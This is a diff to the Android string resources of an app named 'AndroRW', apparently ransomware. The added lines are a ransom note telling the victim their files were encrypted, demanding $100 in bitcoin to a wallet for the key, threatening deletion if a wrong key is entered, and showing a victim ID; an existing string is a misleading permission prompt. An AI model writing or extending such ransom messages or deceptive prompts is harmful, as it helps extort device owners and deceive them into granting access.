@@ -2,4 +2,15 @@
     <string name="app_name" translatable="false">AndroRW</string>
     <string name="alert_title">Needs permission</string>
     <string name="alert_message">This app needs permissions to save encrypted data on the device, Click yes to allow.</string>
+
+    <string name="encrypt_message">Your files were encrypted.</string>
+    <string name="instructions"> You need send $ 100 in bitcoin to 27bddyb3238h wallet to receive the key</string>
+
+    <string name="warning">BE CAREFUL, IF YOU TRY PUT A INVALID KEY YOUR FILES WILL BE DELETED</string>
+
+    <string name="decrypt_button"> DECRYPT! </string>
+
+    <string name="message_id"> Don\'t forget baby, your ID is: %s </string>
+
+    <string name="tryng_decrypt"> Tryng decrypt... Good luck :D</string>
 </resources>
